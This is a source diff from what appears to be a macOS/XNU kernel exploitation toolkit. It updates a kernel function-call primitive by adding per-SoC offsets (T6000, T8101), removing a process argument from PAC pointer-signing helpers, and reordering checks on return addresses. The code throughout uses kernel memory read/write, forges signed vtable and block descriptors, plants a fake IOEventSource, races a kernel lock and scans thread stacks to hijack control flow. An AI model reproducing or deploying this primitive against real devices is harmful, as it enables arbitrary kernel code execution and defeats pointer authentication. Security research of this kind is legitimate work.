@@ -32,8 +32,15 @@
 #include "macos_params.h"
 #include "macos_arm64.h"
 
+#if defined(KERNEL_T6000)
 #define ARM64_THREAD_ERET_ENTRY_OFFSET 0x14c
 #define HV_VPCPU_ERET_ENTRY_OFFSET 0x218
+#elif defined(KERNEL_T8101)
+#define ARM64_THREAD_ERET_ENTRY_OFFSET 0x38
+#define HV_VPCPU_ERET_ENTRY_OFFSET 0xc0
+#else
+#error "unknown kernel variant"
+#endif
 
 #define LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET 0x24
 #define LR_IS_IO_CONNECT_METHOD_OFFSET 0x194
@@ -75,16 +82,15 @@ struct xe_util_kfunc {
 };
 
 
-uintptr_t xe_util_kfunc_sign_address(uintptr_t proc, uintptr_t address, uintptr_t ctx_base, uint16_t descriminator) {
+uintptr_t xe_util_kfunc_sign_address(uintptr_t address, uintptr_t ctx_base, uint16_t descriminator) {
     uintptr_t address_out;
-    int error = xe_util_pacda_sign(proc, address, XE_PTRAUTH_BLEND_DISCRIMINATOR_WITH_ADDRESS(descriminator, ctx_base), &address_out);
+    int error = xe_util_pacda_sign(address, XE_PTRAUTH_BLEND_DISCRIMINATOR_WITH_ADDRESS(descriminator, ctx_base), &address_out);
     xe_assert_err(error);
     return address_out;
 }
 
 
 xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
-    uintptr_t proc = xe_xnu_proc_current_proc();
     uintptr_t free_zone = xe_util_zalloc_find_zone_at_index(free_zone_idx);
     xe_assert(xe_kmem_read_uint64(free_zone, 0) == 0);
     
@@ -98,9 +104,9 @@ xe_util_kfunc_t xe_util_kfunc_create(uint free_zone_idx) {
     uintptr_t block = xe_util_zalloc_alloc(block_allocator, 0);
     uintptr_t counter = xe_util_zalloc_alloc(counter_allocator, 0);
     
-    uintptr_t io_event_source_vtable = xe_util_kfunc_sign_address(proc, xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), io_event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
+    uintptr_t io_event_source_vtable = xe_util_kfunc_sign_address( xe_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), io_event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
     
-    uintptr_t block_descriptor = xe_util_kfunc_sign_address(proc, free_zone, block + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
+    uintptr_t block_descriptor = xe_util_kfunc_sign_address(free_zone, block + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
     
     xe_util_kfunc_t util = malloc(sizeof(struct xe_util_kfunc));
     
@@ -215,6 +221,12 @@ void xe_util_kfunc_reset(xe_util_kfunc_t util) {
 void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t args[8]) {
     xe_log_debug("calling function %p with x0: %p, x1: %p, x2: %p, x3: %p, x4: %p, x5: %p, x6: %p and x7: %p", (void*)target_func, (void*)args[0], (void*)args[1], (void*)args[2], (void*)args[3], (void*)args[4], (void*)args[5], (void*)args[6], (void*)args[7]);
     
+    uintptr_t lr_unregister_event_source = xe_slider_kernel_slide(FUNC_IO_EVENT_SOURCE_FREE_ADDR) + LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(lr_unregister_event_source - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_ADDR), lr_unregister_event_source - 4));
+    
+    uintptr_t lr_is_io_connect_method = xe_slider_kernel_slide(FUNC_XIO_CONNECT_METHOD_ADDR) + LR_IS_IO_CONNECT_METHOD_OFFSET;
+    xe_assert_cond(xe_kmem_read_uint32(lr_is_io_connect_method - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IS_IO_CONNECT_METHOD_ADDR), lr_is_io_connect_method - 4));
+    
     if (!xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0)) {
         xe_log_debug("initializing gIOStasticsLock");
         uintptr_t lock = xe_allocator_small_allocate_disowned(16);
@@ -224,9 +236,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
         xe_kmem_write(lock, 0, data, sizeof(data));
         xe_kmem_write_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0, lock);
     }
-    
-    uintptr_t proc = xe_xnu_proc_current_proc();
-    
+        
     uintptr_t surface;
     IOSurfaceRef surface_ref = xe_io_surface_create(&surface);
     xe_log_debug("created io_surface at %p", (void*)surface);
@@ -241,7 +251,7 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     xe_assert_err(error);
     
     xe_log_debug("acquiring lock");
-    xe_util_lck_rw_t io_statistics_lock = xe_util_lck_rw_lock_exclusive(proc, xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
+    xe_util_lck_rw_t io_statistics_lock = xe_util_lck_rw_lock_exclusive( xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
     
     uintptr_t* waiting_thread = alloca(sizeof(uintptr_t));
     dispatch_semaphore_t sem_surface_destroying = dispatch_semaphore_create(0);
@@ -260,15 +270,9 @@ void xe_util_kfunc_exec(xe_util_kfunc_t util, uintptr_t target_func, uint64_t ar
     error = xe_util_lck_rw_wait_for_contention(io_statistics_lock, *waiting_thread, 0, NULL);
     xe_assert_err(error);
     
-    uintptr_t lr_unregister_event_source = xe_slider_kernel_slide(FUNC_IO_EVENT_SOURCE_FREE_ADDR) + LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET;
-    xe_assert_cond(xe_kmem_read_uint32(lr_unregister_event_source - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_ADDR), lr_unregister_event_source - 4));
-    
     uintptr_t lr_unregister_event_source_stack_ptr;
     error = xe_xnu_thread_scan_stack(*waiting_thread, lr_unregister_event_source, XE_PTRAUTH_MASK, 1024, &lr_unregister_event_source_stack_ptr);
     xe_assert_err(error);
-    
-    uintptr_t lr_is_io_connect_method = xe_slider_kernel_slide(FUNC_XIO_CONNECT_METHOD_ADDR) + LR_IS_IO_CONNECT_METHOD_OFFSET;
-    xe_assert_cond(xe_kmem_read_uint32(lr_is_io_connect_method - 4, 0), ==, xe_util_asm_build_bl_instr(xe_slider_kernel_slide(FUNC_IS_IO_CONNECT_METHOD_ADDR), lr_is_io_connect_method - 4));
     
     uintptr_t lr_is_io_connect_method_stack_ptr;
     error = xe_xnu_thread_scan_stack(*waiting_thread, lr_is_io_connect_method, XE_PTRAUTH_MASK, 1024, &lr_is_io_connect_method_stack_ptr);
